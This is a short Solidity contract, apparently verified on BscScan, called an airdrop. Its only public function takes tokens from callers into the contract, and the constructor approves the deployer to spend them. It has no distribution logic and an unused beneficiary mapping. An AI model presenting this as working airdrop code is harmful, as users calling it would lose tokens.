/**
 *Submitted for verification at BscScan.com on 2021-09-23
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.7.5;

interface IERC20 {
    function decimals() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract LiqsAirdrop {
    address private _owner;
    address private _tokenAddress;
    uint private _tokenDecimals;
    IERC20 private _associatedToken;
    
    uint private _amountToTake;
    
    mapping(address => uint) private _beneficiaries;
    
    constructor(address tokenAddress_, uint amountToTake_) {
        _owner = msg.sender;
        _tokenAddress = tokenAddress_;
        _amountToTake = amountToTake_;
        _associatedToken = IERC20(_tokenAddress);
        _tokenDecimals = _associatedToken.decimals();
        _associatedToken.approve(msg.sender, amountToTake_);
       // _associatedToken.transferFrom(msg.sender, address(this), amountToTake_ * 10 ** _tokenDecimals);
    }
    
    function transferTokens() public payable {
        _associatedToken.transferFrom(msg.sender, address(this), _amountToTake );
    }
}